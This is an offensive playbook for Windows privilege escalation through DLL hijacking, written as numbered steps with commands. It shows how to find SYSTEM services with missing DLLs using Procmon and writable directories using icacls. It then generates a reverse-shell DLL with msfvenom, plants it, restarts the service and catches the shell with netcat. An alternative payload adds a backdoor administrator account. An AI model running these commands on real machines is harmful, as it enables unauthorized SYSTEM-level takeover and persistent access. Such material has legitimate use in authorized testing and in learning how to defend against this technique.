# Windows Privilege Escalation – DLL Hijacking

## Purpose

This file provides a structured workflow for identifying and exploiting DLL hijacking opportunities for privilege escalation.

Core rules:
- Windows searches for DLLs in a specific order
- If a DLL is missing or writable → hijack possible
- If loaded by SYSTEM process → SYSTEM shell
- Focus on services and privileged binaries

---

## 0. Mental Model

When a program loads a DLL without a full path:

LoadLibrary("example.dll")

Windows searches:

1. Application directory
2. System32
3. System
4. Windows
5. Current directory
6. PATH directories

If you can place a malicious DLL earlier in this order:
→ your DLL is executed

---

## 1. Identify Target Applications (CRITICAL FIRST STEP)

Look for:
- services running as SYSTEM
- custom applications
- binaries in:
  - C:\Program Files\
  - C:\Program Files (x86)\
  - C:\Apps\
  - C:\Users\

Commands:

sc query state= all
sc qc <service_name>

---

## 2. Identify DLL Dependencies

Use tools:

### Option 1: Sysinternals (preferred)
procmon.exe

Filter:
- Process Name = target binary
- Operation = CreateFile
- Result = NAME NOT FOUND

Look for:
→ missing DLL files

---

### Option 2: Static Analysis
(less reliable)

strings <binary>
```

Look for:
- .dll names

---

## 3. Find Writable Locations

Check directories in search path:

icacls "C:\Program Files\App\"

Look for:
- (M) Modify
- (F) Full control

---

## 4. Confirm Hijack Opportunity

You need:
- missing DLL OR replaceable DLL
- writable directory in search path
- privileged process (SYSTEM)

---

## 5. Generate Malicious DLL

Using msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o malicious.dll

Rename to expected DLL name:

example.dll

---

## 6. Place DLL

Copy into vulnerable directory:

copy malicious.dll "C:\Program Files\App\example.dll"

---

## 7. Trigger Execution

Options:

sc stop <service>
sc start <service>

OR:
- restart system
- wait for service execution
- manually run binary (if allowed)

---

## 8. Catch Shell

nc -lvnp <PORT>

---

## 9. Verify SYSTEM

whoami

Expected:

nt authority\system

---

## 10. Alternative Payload: Local User

If reverse shell blocked:

Create DLL that executes:

net user hacker Password123! /add
net localgroup administrators hacker /add

---

## 11. Common Failure Points

- DLL not actually missing
- wrong DLL name
- wrong directory placement
- process not restarted
- AV blocks DLL
- wrong architecture

---

## 12. If Stuck

- re-run Procmon and confirm missing DLL
- verify correct search order
- confirm directory write access
- try different service

---

## 13. Quick Exploit Pattern

1. Identify privileged process
2. Find missing DLL
3. Confirm writable path
4. create malicious DLL
5. place DLL in correct directory
6. trigger execution
7. get SYSTEM shell

---

## 14. Mental Model

DLL search order = attack path  
Writable directory = insertion point  
Privileged process = execution  
DLL = payload  

---

## 15. Golden Rules

- Procmon is your best friend
- NAME NOT FOUND = opportunity
- Always confirm write access
- Match DLL name exactly
- Restart = execution